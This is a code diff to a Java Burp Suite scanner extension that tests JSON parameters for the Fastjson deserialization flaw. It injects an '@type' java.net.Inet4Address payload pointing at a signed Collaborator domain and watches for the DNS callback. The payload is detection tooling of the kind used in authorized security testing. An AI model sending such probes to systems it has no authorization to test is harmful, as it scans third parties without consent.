@@ -1,12 +1,13 @@
 package BrianW.AKA.BigChan.PowerScanner;
 
-import BrianW.AKA.BigChan.Tools.CollaboratorData;
-import BrianW.AKA.BigChan.Tools.Global;
-import BrianW.AKA.BigChan.Tools.hitRst;
-import BrianW.AKA.BigChan.Tools.utils;
+import BrianW.AKA.BigChan.Tools.*;
 import burp.*;
 
+import java.nio.charset.StandardCharsets;
 import java.util.Date;
+import java.util.List;
+
+import static java.lang.Thread.sleep;
 
 public class ScanFastJson  extends Reporter {
     protected IBurpExtenderCallbacks callbacks;
@@ -28,34 +29,38 @@ public class ScanFastJson  extends Reporter {
         if (insertionPointType == 36) {
 //            callbacks.printOutput("param: " + baseName + " ,type: " + insertionPointType + " ,value: " + baseValue);
             if (utils.isJson(baseValue)){
-                String collaboratorPayload = Global.interactionServer.getCollaboratorContext().generatePayload(true);
+                IBurpCollaboratorClientContext collaboratorContext = this.callbacks.createBurpCollaboratorClientContext();
+                String collaboratorPayload = collaboratorContext.generatePayload(true);
                 callbacks.printOutput("generate Fastjson collaboratorPayload: " + collaboratorPayload);
-                String payload = "{ \"" + utils.getRandomString(3) + "\":[[{\"@type\":\"java.net.Inet4Address\",\"val\":\"" + collaboratorPayload + "\"}]]} ";
+                String sig = utils.getRandomString(3).toLowerCase();
+                String payload = String.format("{ \"%s\":[[{\"@type\":\"java.net.Inet4Address\",\"val\":\"%s.%s\"}]]} ", utils.getRandomString(3), sig, collaboratorPayload);
                 byte[] reqEvil = insertionPoint.buildRequest((payload).getBytes());
                 IHttpRequestResponse pairEvil = callbacks.makeHttpRequest(
                         baseRequestResponse.getHttpService(),
                         reqEvil
                 );
                 pairEvil.setComment(payload);
-                CollaboratorData collaboratorData = new CollaboratorData(
-                        reporter(
-                                "Fastjson vulnerability found",
-                                String.format("param: %s <br>" +
-                                                "InsertionPointType: %s <br>" +
-                                                "Payload: %s"
-                                        ,
-                                        baseName,
-                                        insertionPointType,
-                                        payload
-                                ),
-                                "High",
-                                "Certain",
-                                pairEvil
+                FetchCollaboratorWithSig fetch = new FetchCollaboratorWithSig(reporter(
+                        "Fastjson vulnerability found",
+                        String.format("param: %s <br>" +
+                                        "InsertionPointType: %s <br>" +
+                                        "Payload: %s"
+                                ,
+                                baseName,
+                                insertionPointType,
+                                payload
                         ),
-                        new Date(),
-                        ""
+                        "High",
+                        "Certain",
+                        pairEvil
+                ),
+                        collaboratorPayload,
+                        sig,
+                        callbacks,
+                        helpers,
+                        collaboratorContext
                 );
-                Global.interactionServer.addToPairList(collaboratorPayload,collaboratorData);
+                fetch.start();
             }
         }
         return null;
